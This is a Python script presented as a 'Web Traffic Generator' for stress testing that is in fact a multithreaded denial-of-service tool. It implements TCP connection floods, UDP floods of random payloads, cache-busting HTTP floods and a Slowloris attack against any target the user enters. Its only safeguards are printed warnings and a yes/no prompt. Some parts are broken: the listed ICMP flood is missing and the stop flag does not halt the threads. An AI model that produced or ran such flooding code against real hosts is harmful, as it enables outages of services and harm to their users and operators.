#!/usr/bin/env python3
"""
Web Traffic Generator
A tool for generating HTTP/HTTPS traffic to conduct web application stress testing and resilience testing.
"""

import socket
import random
import time
import threading
import urllib3
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run():
    print("\033[92m" + "="*70)
    print("           WEB TRAFFIC GENERATOR - HTTP Stress Testing")
    print("="*70 + "\033[0m\n")
    
    print("\033[91m[!] CRITICAL WARNING: Use only for authorized testing!\033[0m")
    print("\033[91m[!] Unauthorized DoS attacks are illegal.\033[0m\n")
    
    target_input = input("\033[97m[?] Enter target URL or IP/Domain: \033[0m").strip()
    
    if not target_input:
        print("\033[91m[!] Invalid target.\033[0m")
        return
    
    # Parse URL if provided
    if target_input.startswith('http://') or target_input.startswith('https://'):
        parsed = urlparse(target_input)
        target = parsed.hostname
        default_port = 443 if parsed.scheme == 'https' else 80
        port_input = input(f"\033[97m[?] Enter target port (default {default_port}): \033[0m").strip()
        port = int(port_input) if port_input.isdigit() else default_port
    else:
        target = target_input
        port_input = input("\033[97m[?] Enter target port (default 80): \033[0m").strip()
        port = int(port_input) if port_input.isdigit() else 80
    
    print("\n\033[97m[*] Traffic Types:\033[0m")
    print("  [1] TCP SYN Flood")
    print("  [2] UDP Flood")
    print("  [3] ICMP Flood")
    print("  [4] HTTP Flood")
    print("  [5] Slowloris Attack")
    
    attack_type = input("\n\033[95m[?] Select traffic type: \033[0m").strip()
    
    threads_num = input("\033[97m[?] Number of threads (1-100): \033[0m").strip()
    threads_num = int(threads_num) if threads_num.isdigit() and 1 <= int(threads_num) <= 100 else 10
    
    confirm = input("\n\033[93m[?] Confirm you are authorized to test this target (yes/no): \033[0m").strip().lower()
    if confirm != 'yes':
        print("\033[91m[!] Attack cancelled.\033[0m")
        return
    
    # Test connection first
    print(f"\n\033[97m[*] Testing connection to {target}:{port}...\033[0m")
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(5)
        test_socket.connect((target, port))
        test_socket.close()
        print(f"\033[92m[+] Connection successful!\033[0m")
    except socket.gaierror:
        print(f"\033[91m[!] Error: Could not resolve hostname '{target}'\033[0m")
        return
    except socket.timeout:
        print(f"\033[91m[!] Error: Connection timeout to {target}:{port}\033[0m")
        return
    except ConnectionRefusedError:
        print(f"\033[91m[!] Error: Connection refused by {target}:{port}\033[0m")
        return
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")
        return
    
    attack_running = True
    packets_sent = [0]
    errors = [0]
    
    def tcp_flood():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
                s.send(request.encode())
                packets_sent[0] += 1
                s.close()
            except Exception as e:
                errors[0] += 1
                if errors[0] <= 3:  # Only print first 3 errors
                    print(f"\n\033[91m[!] TCP Error: {str(e)[:50]}\033[0m")
    
    def udp_flood():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                import os
                payload = os.urandom(1024)
                s.sendto(payload, (target, port))
                packets_sent[0] += 1
                s.close()
            except Exception as e:
                errors[0] += 1
                if errors[0] <= 3:
                    print(f"\n\033[91m[!] UDP Error: {str(e)[:50]}\033[0m")
    
    def http_flood():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))
                request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
                s.send(request.encode())
                packets_sent[0] += 1
                s.close()
            except Exception as e:
                errors[0] += 1
                if errors[0] <= 3:
                    print(f"\n\033[91m[!] HTTP Error: {str(e)[:50]}\033[0m")
    
    def slowloris():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {random.randint(0, 2000)}\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                packets_sent[0] += 1
                time.sleep(15)
                s.close()
            except Exception as e:
                errors[0] += 1
                if errors[0] <= 3:
                    print(f"\n\033[91m[!] Slowloris Error: {str(e)[:50]}\033[0m")
    
    print(f"\n\033[92m[*] Starting traffic generation with {threads_num} threads...\033[0m")
    print("\033[93m[*] Press Ctrl+C to stop\033[0m\n")
    
    try:
        threads = []
        
        for i in range(threads_num):
            if attack_type == '1':
                t = threading.Thread(target=tcp_flood)
            elif attack_type == '2':
                t = threading.Thread(target=udp_flood)
            elif attack_type == '4':
                t = threading.Thread(target=http_flood)
            elif attack_type == '5':
                t = threading.Thread(target=slowloris)
            else:
                print("\033[91m[!] Invalid attack type.\033[0m")
                return
            
            t.daemon = True
            t.start()
            threads.append(t)
        
        while True:
            print(f"\r\033[97m[*] Packets sent: {packets_sent[0]} | Errors: {errors[0]}\033[0m", end='', flush=True)
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n\n\033[92m[*] Stopping traffic generation...\033[0m")
        attack_running = False
        time.sleep(2)
        print(f"\033[92m[*] Total packets sent: {packets_sent[0]}\033[0m")
        print(f"\033[93m[*] Total errors: {errors[0]}\033[0m")
    
    except Exception as e:
        print(f"\n\033[91m[!] Error: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
